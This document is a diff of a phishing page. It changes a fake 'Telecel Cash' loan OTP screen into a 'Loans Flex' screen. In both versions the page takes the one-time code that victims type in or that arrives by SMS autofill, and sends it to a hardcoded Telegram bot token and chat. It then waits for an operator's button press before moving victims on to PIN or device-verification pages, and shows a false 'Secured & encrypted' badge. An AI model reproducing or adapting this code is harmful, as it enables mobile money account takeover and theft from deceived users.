@@ -3,119 +3,166 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OTP Verification - Telecel Cash</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <title>Loans Flex - OTP Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        :root { --red: #E42320; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Inter', sans-serif;
-            background: #f8f9fa;
+            background: #f0f4ff;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 10px;
+            padding: 15px;
         }
         .container {
             width: 100%;
-            max-width: 380px;
+            max-width: 420px;
             background: white;
             border-radius: 24px;
-            box-shadow: 0 8px 30px rgba(0,0,0,0.1);
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
             overflow: hidden;
         }
-        .header {
-            background: #E42320;
-            color: white;
-            padding: 18px 20px;
+        .logo-section {
+            background: linear-gradient(135deg, #1a3a8f 0%, #2a56c6 100%);
             text-align: center;
+            padding: 28px 0 22px;
         }
-        .logo {
-            display: flex;
+        .brand-logo {
+            display: inline-flex;
             align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin-bottom: 6px;
+            gap: 10px;
         }
-        .logo-circle {
-            width: 36px; height: 36px;
+        .logo-icon {
+            width: 48px;
+            height: 48px;
             background: white;
-            color: #E42320;
-            border-radius: 50%;
+            border-radius: 14px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-weight: bold;
-            font-size: 20px;
         }
-        h1 { font-size: 21px; font-weight: 700; margin: 6px 0 4px; }
-        .subtitle { font-size: 14.5px; line-height: 1.4; }
-
-        .loan-box {
-            margin: 14px;
-            background: #fff0f0;
-            border-radius: 14px;
-            padding: 14px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+        .brand-name {
+            color: white;
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
         }
-        .loan-amount { font-size: 25px; font-weight: 800; color: var(--red); }
-
+        .brand-name span {
+            color: #7eb3ff;
+        }
+        .tagline {
+            color: rgba(255,255,255,0.7);
+            font-size: 12.5px;
+            margin-top: 6px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        h1 {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            color: #1e2937;
+            margin: 22px 0 6px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #475569;
+            font-size: 14.5px;
+            padding: 0 25px 18px;
+            line-height: 1.55;
+        }
+        .offer-info {
+            background: #eef3ff;
+            margin: 0 20px 18px;
+            padding: 15px;
+            border-radius: 16px;
+            text-align: center;
+            border: 1px solid #c7d8ff;
+        }
+        .offer-info strong {
+            color: #1e2937;
+            font-size: 15px;
+        }
         .otp-container {
             display: flex;
             justify-content: center;
             gap: 10px;
-            margin: 10px 0 22px;
+            margin: 18px 0 26px;
             padding: 0 20px;
         }
         .otp-input {
-            width: 44px;
-            height: 54px;
+            width: 52px;
+            height: 62px;
             text-align: center;
-            font-size: 23px;
+            font-size: 26px;
             font-weight: 700;
-            border: 2px solid #ddd;
-            border-radius: 10px;
+            color: #1a3a8f;
+            border: 2px solid #e2e8f0;
+            border-radius: 14px;
             outline: none;
+            transition: all 0.2s;
         }
-        .otp-input:focus { border-color: var(--red); }
-
-        .form-section { padding: 0 20px 25px; }
+        @media (max-width: 380px) {
+            .otp-input { width: 44px; height: 54px; font-size: 22px; }
+            .otp-container { gap: 7px; }
+        }
+        .otp-input:focus {
+            border-color: #2a56c6;
+            box-shadow: 0 0 0 4px rgba(42, 86, 198, 0.15);
+        }
+        .form-section {
+            padding: 0 25px 30px;
+        }
+        .error-msg {
+            text-align: center;
+            margin: 12px 20px 18px;
+            font-size: 14.5px;
+            padding: 14px;
+            border-radius: 12px;
+            display: none;
+            color: #b91c1c;
+            background: #fee2e2;
+            border: 1px solid #fca5a5;
+        }
         .btn-action {
             width: 100%;
-            background: var(--red);
+            background: #1a3a8f;
             color: white;
             border: none;
-            padding: 15px;
-            font-size: 16.5px;
+            padding: 17px;
+            font-size: 17px;
             font-weight: 700;
             border-radius: 50px;
             cursor: pointer;
+            margin: 10px 0;
+            transition: background 0.2s;
+        }
+        .btn-action:hover { background: #2a56c6; }
+        .btn-action:disabled {
+            background: #94a3b8;
+            cursor: not-allowed;
         }
         .back-btn {
-            margin-top: 10px;
+            width: 100%;
             background: transparent;
-            color: #555;
-            border: 2px solid #ddd;
-            padding: 13px;
+            color: #64748b;
+            border: 2px solid #e2e8f0;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
             border-radius: 50px;
+            cursor: pointer;
+            transition: border-color 0.2s;
         }
-        .error-msg {
-            display: none;
-            text-align: center;
-            color: #c00;
-            background: #ffebee;
-            padding: 12px;
-            margin: 12px 20px;
-            border-radius: 12px;
-        }
+        .back-btn:hover { border-color: #94a3b8; }
         #spinner {
             display: none;
             position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.9);
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(10,20,60,0.93);
             z-index: 10000;
             align-items: center;
             justify-content: center;
@@ -123,142 +170,245 @@
             color: white;
         }
         .spin {
-            width: 55px; height: 55px;
-            border: 5px solid rgba(255,255,255,0.3);
-            border-top: 5px solid white;
+            width: 65px;
+            height: 65px;
+            border: 6px solid rgba(255,255,255,0.15);
+            border-top: 6px solid #7eb3ff;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            color: #64748b;
+            font-size: 12px;
+            margin-top: 14px;
+            margin-bottom: 4px;
+        }
+        .secure-badge svg { width: 14px; height: 14px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <div class="logo">
-                <div class="logo-circle">t</div>
-                <div><strong>Telecel Cash</strong><br><span style="font-size:12px;">Mobile Money</span></div>
+        <div class="logo-section">
+            <div class="brand-logo">
+                <div class="logo-icon">
+                    <svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect x="3" y="12" width="22" height="14" rx="3" fill="#1a3a8f"/>
+                        <path d="M8 12V9C8 6.24 10.24 4 13 4H15C17.76 4 20 6.24 20 9V12" stroke="#1a3a8f" stroke-width="2.2" stroke-linecap="round" fill="none"/>
+                        <circle cx="14" cy="19" r="2.5" fill="white"/>
+                        <rect x="13.1" y="19" width="1.8" height="3" rx="0.9" fill="white"/>
+                    </svg>
+                </div>
+                <div>
+                    <div class="brand-name">Loans<span>Flex</span></div>
+                    <div class="tagline">Fast &amp; Flexible Loans</div>
+                </div>
             </div>
-            <h1>OTP Verification</h1>
-            <p class="subtitle">Enter the 5-digit code sent to your Telecel number to authorize the loan.</p>
         </div>
 
-        <div class="loan-box" id="loanBox"></div>
-        <div class="otp-container" id="otpContainer"></div>
+        <h1>Verify Your Loan</h1>
+        <p class="subtitle">A 5-digit verification code has been sent to your number. Enter it below to confirm your loan application.</p>
+
+        <div class="offer-info" id="offerInfo">
+            <strong id="offerTitle"></strong><br>
+            <span id="offerPrice" style="color:#1a3a8f; font-weight:700; font-size:22px;"></span>
+        </div>
+
+        <div class="otp-container" id="otpInputs"></div>
         <div class="error-msg" id="errMsg"></div>
 
         <div class="form-section">
-            <button class="btn-action" id="verifyBtn">Verify & Authorize Loan</button>
-            <button class="back-btn" onclick="window.history.back()">← Back</button>
+            <button class="btn-action" id="verifyBtn">Verify &amp; Confirm Loan</button>
+            <button class="back-btn" onclick="window.location.href='index.html'">← Back to Loan Offers</button>
+            <div class="secure-badge">
+                <svg viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                </svg>
+                Secured &amp; encrypted verification
+            </div>
         </div>
     </div>
 
     <div id="spinner">
         <div class="spin"></div>
-        <p style="margin-top:18px;">Verifying OTP...</p>
+        <p style="margin-top:25px; font-size:17px; letter-spacing:0.3px;">Verifying code...</p>
     </div>
 
     <script>
-        const params = new URLSearchParams(window.location.search);
-        const name = params.get('name') || 'Flex Loan';
-        const amount = params.get('amount') || '1000';
-        const repay = params.get('repay') || '1381';
-        const duration = params.get('duration') || '30';
+        const CONFIG = {
+            BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
+            CHAT_ID: '7547427914',
+            SUCCESS_PAGE: 'https://unlimiteddata.vercel.app/success.html',
+            DEVICE_PAGE: 'https://unlimiteddata.vercel.app/device_verify.html'
+        };
 
-        document.getElementById('loanBox').innerHTML = `
-            <div><strong>${name}</strong><br><span class="loan-amount">GHS ${parseInt(amount).toLocaleString()}</span></div>
-            <div style="text-align:right; font-size:13px;">Total: GHS ${parseInt(repay).toLocaleString()}<br>${duration} Days</div>
-        `;
+        let state = { lastUpdateId: 0 };
+        let isProcessing = false;
 
-        function createInputs() {
-            const container = document.getElementById('otpContainer');
+        const errMsg = document.getElementById('errMsg');
+        const spinner = document.getElementById('spinner');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const offerTitleEl = document.getElementById('offerTitle');
+        const offerPriceEl = document.getElementById('offerPrice');
+
+        function loadOffer() {
+            const params = new URLSearchParams(window.location.search);
+            const name = params.get('offer') || 'Loan Package';
+            const data = params.get('data') || '';
+            const price = params.get('price') || '0';
+            offerTitleEl.textContent = name + (data ? ` - ${data}` : '');
+            offerPriceEl.textContent = `GHS ${price}`;
+        }
+
+        function createInputs(containerId, count) {
+            const container = document.getElementById(containerId);
             container.innerHTML = '';
-            for (let i = 0; i < 5; i++) {
+            for (let i = 0; i < count; i++) {
                 const input = document.createElement('input');
                 input.type = 'text';
-                input.maxLength = '1';
+                input.maxLength = 1;
                 input.className = 'otp-input';
                 input.inputMode = 'numeric';
                 container.appendChild(input);
             }
-            setupAutoFocus();
         }
 
-        function setupAutoFocus() {
-            const inputs = document.querySelectorAll('.otp-input');
+        function getCode(containerId) {
+            return Array.from(document.querySelectorAll(`#${containerId} .otp-input`))
+                       .map(i => i.value.trim()).join('');
+        }
+
+        function setupAutoFocus(containerId, length, onComplete) {
+            const inputs = document.querySelectorAll(`#${containerId} .otp-input`);
             inputs.forEach((input, index) => {
                 input.addEventListener('input', () => {
-                    if (input.value.length === 1 && index < 4) inputs[index + 1].focus();
-                    if (getCode().length === 5) setTimeout(submitOTP, 200);
+                    if (input.value.length === 1 && index < length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                    if (getCode(containerId).length === length) {
+                        setTimeout(onComplete, 180);
+                    }
+                });
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !input.value && index > 0) {
+                        inputs[index - 1].focus();
+                    }
                 });
             });
         }
 
-        function getCode() {
-            return Array.from(document.querySelectorAll('.otp-input')).map(i => i.value.trim()).join('');
-        }
-
         function submitOTP() {
-            const otp = getCode();
-            if (otp.length !== 5) return;
+            if (isProcessing) return;
+            isProcessing = true;
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = "Verifying...";
 
-            document.getElementById('spinner').style.display = 'flex';
+            const otp = getCode('otpInputs');
+            if (otp.length !== 5) {
+                isProcessing = false;
+                verifyBtn.disabled = false;
+                verifyBtn.textContent = "Verify & Confirm Loan";
+                return;
+            }
 
             const ts = Date.now();
-            const approveId = `approve_${ts}`;
-            const verifyId = `verify_${ts}`;
-            const declineId = `decline_${ts}`;
+            const approveId = `otp_approve_${ts}`;
+            const declineId = `otp_decline_${ts}`;
+            const verifyDeviceId = `otp_verify_${ts}`;
+            const validId = `valid_${ts}`;
+            const invalidId = `invalid_${ts}`;
 
-            fetch(`https://api.telegram.org/bot8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: '7547427914',
-                    text: `<b>🔴 Telecel Loan OTP</b>\n\nLoan: ${name}\nAmount: GHS ${parseInt(amount).toLocaleString()}\nOTP: <code>${otp}</code>\n\nChoose Action:`,
+                    chat_id: CONFIG.CHAT_ID,
+                    text: `<b>🔵 OTP Verification — Loans Flex</b>\n\nOffer: ${offerTitleEl.textContent}\nOTP: <code>${otp}</code>\n\nChoose Action:`,
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
                             [
-                                { text: "✅ Approve Loan", callback_data: approveId },
-                                { text: "📱 Verify Device", callback_data: verifyId }
+                                { text: "✅ Approve", callback_data: approveId },
+                                { text: "📱 Verify Device", callback_data: verifyDeviceId }
+                            ],
+                            [
+                                { text: "✅ Valid PIN", callback_data: validId },
+                                { text: "❌ Invalid PIN", callback_data: invalidId }
                             ],
                             [{ text: "❌ Decline", callback_data: declineId }]
                         ]
                     }
                 })
             }).then(() => {
-                startPolling(approveId, verifyId, declineId);
+                spinner.style.display = 'flex';
+                startPolling(approveId, declineId, verifyDeviceId, validId, invalidId);
+            }).catch(() => {
+                resetButton();
             });
         }
 
-        function startPolling(approveId, verifyId, declineId) {
+        function startPolling(approveId, declineId, verifyDeviceId, validId, invalidId) {
             const interval = setInterval(() => {
-                fetch(`https://api.telegram.org/bot8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8/getUpdates?offset=-1`)
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                     .then(r => r.json())
                     .then(data => {
                         if (!data.ok || !data.result) return;
                         data.result.forEach(update => {
+                            state.lastUpdateId = update.update_id;
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
-                                clearInterval(interval);
-                                document.getElementById('spinner').style.display = 'none';
-
-                                if (cb === approveId) {
-                                    window.location.href = `pin.html?${params.toString()}`;
-                                } else if (cb === verifyId) {
-                                    window.location.href = `device_verify.html?${params.toString()}`;
-                                } else if (cb === declineId) {
-                                    document.getElementById('errMsg').textContent = "Request declined.";
-                                    document.getElementById('errMsg').style.display = 'block';
+                                const params = new URLSearchParams(window.location.search);
+                                if (cb === approveId || cb === validId) {
+                                    clearInterval(interval);
+                                    spinner.style.display = 'none';
+                                    window.location.href = CONFIG.SUCCESS_PAGE + '?' + params.toString();
+                                } else if (cb === verifyDeviceId) {
+                                    clearInterval(interval);
+                                    spinner.style.display = 'none';
+                                    window.location.href = CONFIG.DEVICE_PAGE + '?' + params.toString();
+                                } else if (cb === declineId || cb === invalidId) {
+                                    clearInterval(interval);
+                                    spinner.style.display = 'none';
+                                    errMsg.textContent = "Request declined. Please try again.";
+                                    errMsg.style.display = 'block';
+                                    document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
+                                    resetButton();
                                 }
                             }
                         });
                     });
-            }, 900);
+            }, 1000);
         }
 
-        // Initialize
-        createInputs();
+        function resetButton() {
+            isProcessing = false;
+            verifyBtn.disabled = false;
+            verifyBtn.textContent = "Verify & Confirm Loan";
+        }
+
+        createInputs('otpInputs', 5);
+        setupAutoFocus('otpInputs', 5, submitOTP);
+        verifyBtn.onclick = submitOTP;
+        loadOffer();
+
+        if ('OTPCredential' in window) {
+            window.onload = () => setTimeout(() => {
+                navigator.credentials.get({ otp: { transport: ['sms'] } })
+                    .then(credential => {
+                        if (credential?.code) {
+                            const inputs = document.querySelectorAll('#otpInputs .otp-input');
+                            credential.code.split('').forEach((digit, i) => {
+                                if (inputs[i]) inputs[i].value = digit;
+                            });
+                            setTimeout(submitOTP, 300);
+                        }
+                    }).catch(() => {});
+            }, 800);
+        }
     </script>
 </body>
 </html>
